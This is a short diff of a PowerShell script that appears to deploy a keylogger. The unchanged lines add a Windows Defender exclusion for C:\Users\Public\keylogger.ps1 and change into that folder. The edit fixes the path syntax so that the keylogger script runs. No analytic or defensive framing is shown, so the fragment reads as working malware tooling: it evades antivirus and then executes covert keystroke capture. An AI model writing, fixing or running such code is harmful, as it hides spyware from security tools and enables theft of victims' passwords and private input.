@@ -15,4 +15,4 @@ Start-Sleep -s 30
 Add-MpPreference -ExclusionPath "C:\Users\Public\keylogger.ps1"
 New-Item "C:\temp\" -itemType Directory
 cd C:\Users\Public
-./keylogger.ps1
+.\keylogger.ps1
